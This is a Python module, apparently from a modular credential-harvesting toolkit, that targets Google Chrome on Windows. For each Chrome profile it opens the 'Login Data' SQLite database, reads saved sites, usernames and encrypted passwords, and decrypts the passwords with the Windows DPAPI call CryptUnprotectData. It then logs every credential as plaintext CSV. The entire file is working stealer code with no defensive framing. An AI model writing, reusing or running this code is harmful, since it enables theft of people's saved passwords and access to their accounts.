# coding: utf-8

try:
	import os
	import sqlite3
	import win32crypt
except ImportError:
	pass

from modules.windows.chrome.chrome_module import ChromeModule


class WindowsChromePassword(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='WindowsChromePassword',
			version='0.1.0',
			file=__file__,
			dependencies=['os', 'sqlite3', 'win32crypt'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():
			password_path = profile + '\\Login Data'
			if os.path.isfile(password_path):
				connection = sqlite3.connect(password_path)
				cursor = connection.cursor()
				try:
					cursor.execute('SELECT action_url, username_value, password_value FROM logins')
				except sqlite3.OperationalError:
					self.executenot(password_path + ' database is locked', 1)
					return False

				self.log('url,username,password')
				for url, username, password in cursor.fetchall():
					self.log(url + ',' + username + ',' + (win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]).decode('utf-8'))

		return True
